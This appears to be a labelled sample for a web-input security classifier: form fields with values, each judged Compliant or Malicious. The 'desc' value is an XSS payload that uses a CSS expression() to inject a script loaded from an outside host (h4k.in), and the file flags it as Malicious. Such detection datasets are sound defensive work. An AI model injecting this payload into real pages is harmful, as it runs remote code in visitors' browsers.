@@ -1,0 +1,10 @@
+name : 6QSQ 1'z7'Cw'9'
+desc : </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+end : 10.7.2016
+budget : 1,600
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: 6QSQ 1'z7'Cw'9' is: Compliant
+The parameter: desc :  having value: </a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')"> is: Malicious
+The parameter: end :  having value: 10.7.2016 is: Compliant
+The parameter: budget :  having value: 1,600 is: Compliant
